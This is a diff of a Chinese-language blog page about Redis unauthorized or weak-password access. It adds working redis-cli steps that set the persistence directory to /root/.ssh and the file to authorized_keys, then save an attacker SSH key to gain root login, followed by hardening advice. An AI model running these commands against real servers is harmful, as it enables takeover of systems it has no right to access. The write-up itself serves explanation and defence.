@@ -24,7 +24,7 @@
 <meta property="og:description" content="前言Redis 是一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、可选持久性的键值对(Key-Value)存储数据库，并提供多种语言的 API。 当redis配置设置不当，可能会存在数据泄露、服务器入侵等安全风险 漏洞成因当redis服务存在未授权（没有设置密码+没有限制访问IP）或弱口令时，存在被利用 redis 的持久化功能和 config 命令（">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-03-14T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-03-15T07:56:26.166Z">
+<meta property="article:modified_time" content="2024-04-17T12:26:39.809Z">
 <meta property="article:author" content="10000hours">
 <meta property="article:tag" content="security">
 <meta property="article:tag" content="secvulns">
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          461 字
+          1.1k 字
         
       </span>
     
@@ -233,7 +233,7 @@
         
         
         
-          4 分钟
+          10 分钟
         
       </span>
     
@@ -275,7 +275,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2024-03-15T15:56:26+08:00
+                    本文最后更新于 2024-04-17T20:26:39+08:00
                   
                   
 
@@ -304,8 +304,68 @@
 <p>redis 将每一个写命令都通过 write 函数追加到文件中（默认是 appendonly.aof）,当 redis 重启时会通过重新执行文件中保存的写命令来在内存中重建整个数据库的内容</p>
 <p>配置：<br>appendonly yes# 启用日志追加持久化方式</p>
 <p>#appendfsync always #每次收到写命令就立即强制写入磁盘，最慢，但是保证完全的持久化 不推荐使用<br># appendfsync everysec # 每秒强制写入磁盘一次，在性能和持久化方面做了很好的折中，推荐使用<br># appendfsync no #完全依赖操作系统，性能最好，持久化没有保证</p>
-<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><h3 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h3><p>当服务存在未授权</p>
-<h3 id="服务器入侵"><a href="#服务器入侵" class="headerlink" title="服务器入侵"></a>服务器入侵</h3>
+<h2 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h2><h3 id="数据泄露风险"><a href="#数据泄露风险" class="headerlink" title="数据泄露风险"></a>数据泄露风险</h3><p>redis服务没有访问授权限制，任意用户可登录，造成服务中存储的数据被任意用户获取，造成数据泄露</p>
+<h3 id="服务器入侵风险"><a href="#服务器入侵风险" class="headerlink" title="服务器入侵风险"></a>服务器入侵风险</h3><p>redis服务没有访问授权限制，且在服务中可以修改服务配置，例如修改持久化配置，造成恶意用户登录服务，修改配置实现入侵</p>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="未授权-弱口令访问"><a href="#未授权-弱口令访问" class="headerlink" title="未授权&#x2F;弱口令访问"></a>未授权&#x2F;弱口令访问</h3><h4 id="构建SSH免登录"><a href="#构建SSH免登录" class="headerlink" title="构建SSH免登录"></a>构建SSH免登录</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>攻击主机用户的ssh公钥(～&#x2F;.ssh&#x2F;id_rsa.pub)写入目标主机的免登录配置文件authorized_keys中。</p>
+<p>写入任意key的value值为ssh公钥内容，将该数据持久化到指定存在的目录&#x2F;user&#x2F;.ssh中的指定authorized_keys文件中。</p>
+<h5 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h5><p>1、redis服务可未授权访问或弱口令访问</p>
+<p>2、可以使用config命令修改持久化配置</p>
+<p>3、ssh 支持使用 key 的方式进行认证登录</p>
+<p>#RSAAuthentication yes</p>
+<p>#PubkeyAuthentication yes</p>
+<p>AuthorizedKeysFile     .ssh&#x2F;authorized_keys</p>
+<h5 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h5><p>1、获取持久化目录及文件</p>
+<p>config get dir</p>
+<p>config get dbfilename</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">222</span>.<span class="hljs-number">28</span>.<span class="hljs-number">37</span>:<span class="hljs-number">6379</span>&gt; config get dir<br><span class="hljs-attribute">1</span>) <span class="hljs-string">&quot;dir&quot;</span><br><span class="hljs-attribute">2</span>) <span class="hljs-string">&quot;/var/lib/redis&quot;</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">222</span>.<span class="hljs-number">28</span>.<span class="hljs-number">37</span>:<span class="hljs-number">6379</span>&gt; config get dbfilename<br><span class="hljs-attribute">1</span>) <span class="hljs-string">&quot;dbfilename&quot;</span><br><span class="hljs-attribute">2</span>) <span class="hljs-string">&quot;dump.rdb&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>2、设置持久化目录和文件为指定目录文件</p>
+<p>config set dir &#x2F;root&#x2F;.ssh</p>
+<p>config set dbfilename authorized_keys</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.222.28.37:6379</span>&gt; config set dir /root/.ssh<br>OK<br><span class="hljs-number">10.222.28.37:6379</span>&gt; config set dbfilename authorized_keys<br>OK<br><br><span class="hljs-number">10.222.28.37:6379</span>&gt; config get dir<br><span class="hljs-number">1</span>) <span class="hljs-string">&quot;dir&quot;</span><br><span class="hljs-number">2</span>) <span class="hljs-string">&quot;/root/.ssh&quot;</span><br><span class="hljs-number">10.222.28.37:6379</span>&gt; config get dbfilename<br><span class="hljs-number">1</span>) <span class="hljs-string">&quot;dbfilename&quot;</span><br><span class="hljs-number">2</span>) <span class="hljs-string">&quot;authorized_keys&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>3、公钥写入并持久化</p>
+<p>公钥信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  ~ <span class="hljs-built_in">cat</span> ~/.ssh/id_rsa.pub <br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDlzXhaC00n27yfFRNqT2Be+HN+bbzGScxkVlrrL3/TOm57YokSlozrJbil5XXGVGmX8AIM2kcvVLQWHq6bwmu03ew1MQHF/0a//tEP0jCEPARpD28PpnCe92pqBqde+ehlrS9SnFdNZspqmPVjLV4KiEWpL4opwhzDG6GtSA2YQy8Mv4yBH3FETcI4YSireliynZfwTfz6fpDPIQxEnH7cl0u2zMez209hfwIxRGR8e1XSaMlIdl2sntzEriXtOrqjjQ8pSKJp8+HK2S4VzTo5LZEFTqDn29wp5bJYFifFxTqayw2FLPtT0lBQV2ZeQFY9qasvmLEEOUYlDw2b2Scs2hwdvauSRuo+Dyfsws9JdpvVE5s2+pFLv24QaB+fCWGH4UmSUDXWdkA4YYpUME8sCdhLZRQEo5lnlbS/qaRDG4KU+egexR1o7QsigA5a06T73SYnYzGzao2ys1ww9jZgJsWr4w4t3NvGqTQJC4hjAbHr0BvVW+29C/38FGEL+/5bUFUVuJYELYQIM+EDeZR6rBtOmNKm7PgK8DDebdA63e26bGOsfjHmUC10qQaaSM7Tv5SvTIOEQxJfpyqQG9utObRTKTnXT8D4doYfaHth+pot69UbmlspEfwBdw6dK+CUkk6P4fTcrWGwIIZoPO5NPPY1hnpOvCDuUzCqgPLomQ== admin@110.<span class="hljs-built_in">local</span><br></code></pre></td></tr></table></figure>
+
+<p>设置key   set xxx “\n\n\n用户公钥\n\n\n”</p>
+<p>持久化  save</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.222.28.37:6379</span>&gt; set xxx <span class="hljs-string">&quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDlzXhaC00n27yfFRNqT2Be+HN+bbzGScxkVlrrL3/TOm57YokSlozrJbil5XXGVGmX8AIM2kcvVLQWHq6bwmu03ew1MQHF/0a//tEP0jCEPARpD28PpnCe92pqBqde+ehlrS9SnFdNZspqmPVjLV4KiEWpL4opwhzDG6GtSA2YQy8Mv4yBH3FETcI4YSireliynZfwTfz6fpDPIQxEnH7cl0u2zMez209hfwIxRGR8e1XSaMlIdl2sntzEriXtOrqjjQ8pSKJp8+HK2S4VzTo5LZEFTqDn29wp5bJYFifFxTqayw2FLPtT0lBQV2ZeQFY9qasvmLEEOUYlDw2b2Scs2hwdvauSRuo+Dyfsws9JdpvVE5s2+pFLv24QaB+fCWGH4UmSUDXWdkA4YYpUME8sCdhLZRQEo5lnlbS/qaRDG4KU+egexR1o7QsigA5a06T73SYnYzGzao2ys1ww9jZgJsWr4w4t3NvGqTQJC4hjAbHr0BvVW+29C/38FGEL+/5bUFUVuJYELYQIM+EDeZR6rBtOmNKm7PgK8DDebdA63e26bGOsfjHmUC10qQaaSM7Tv5SvTIOEQxJfpyqQG9utObRTKTnXT8D4doYfaHth+pot69UbmlspEfwBdw6dK+CUkk6P4fTcrWGwIIZoPO5NPPY1hnpOvCDuUzCqgPLomQ== admin@110.local\n\n\n&quot;</span><br>OK<br><span class="hljs-number">10.222.28.37:6379</span>&gt; save<br>OK<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>1、设置强口令</p>
+<p>强口令规则：包含大小写子母、数字和特殊字符，长度在10位以上</p>
+<p>redis.conf中配置</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">requirepass foobared</span><br></code></pre></td></tr></table></figure>
+
+<p>2、开启protected-mode，限制本地登录</p>
+<p>redis.conf中配置</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">protected</span>-mode yes<br></code></pre></td></tr></table></figure>
+
+<p>3、监听本地</p>
+<p>redis.conf中配置</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">bind</span> <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure>
+
+<p>4、禁用&#x2F;重命名危险命令（需重启服务）</p>
+<p>常见危险命令：</p>
+<p>flushall   清除所有数据</p>
+<p>flushdb  清除当前db</p>
+<p>keys *  获取所有key</p>
+<p>config   客户端设置服务端命令</p>
+<p>禁用危险命令：</p>
+<p>配置文件中增加 rename-command commandname “” 配置</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> flushall <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> flushdb <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-built_in">keys</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> config <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:6379</span>&gt; flushall<br>(error) ERR unknown command &#x27;flushall&#x27;<br><span class="hljs-number">127.0.0.1:6379</span>&gt; flushdb<br>(error) ERR unknown command &#x27;flushdb&#x27;<br><span class="hljs-number">127.0.0.1:6379</span>&gt; keys *<br>(error) ERR unknown command &#x27;keys&#x27;<br><span class="hljs-number">127.0.0.1:6379</span>&gt; config get dir<br>(error) ERR unknown command &#x27;config&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>重命名危险命令：</p>
+<p>配置文件中增加 rename-command oldname newname 配置</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">flushall</span> <span class="hljs-title">deleteall</span><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">flushdb</span> <span class="hljs-title">deleteall</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:6379</span>&gt; flushall<br>(error) ERR unknown command &#x27;flushall&#x27;<br><span class="hljs-number">127.0.0.1:6379</span>&gt; deleteall<br>OK<br></code></pre></td></tr></table></figure>
+
+
                 
               </div>
             
@@ -399,9 +459,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/03/15/yunwei/dir/procdir/" title="procdir">
+                      <a href="/2024/03/15/yunwei/applications/git/git_sec/" title="git_sec">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">procdir</span>
+                        <span class="hidden-mobile">git_sec</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -409,8 +469,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/03/15/yunwei/applications/firewalld/iptables_command/" title="iptables_command">
-                        <span class="hidden-mobile">iptables_command</span>
+                      <a href="/2024/03/14/security/secvulns/solr/solr_keys/" title="sorl_keys">
+                        <span class="hidden-mobile">sorl_keys</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
